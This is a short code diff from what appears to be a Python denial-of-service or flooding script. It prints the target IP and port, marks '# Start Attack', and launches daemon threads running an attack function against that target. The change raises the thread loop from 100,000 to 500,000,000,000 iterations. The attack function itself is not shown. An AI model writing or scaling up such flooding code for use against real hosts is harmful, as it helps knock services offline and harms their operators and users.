@@ -35,7 +35,7 @@ print(" ")
 print(f"Running {ip} {port}")
 # Start Attack
 
-for i in range(100000):
+for i in range(500000000000):
   t = threading.Thread(target=attack,args=(ip, port), daemon=True)
   t.start()
 while True:
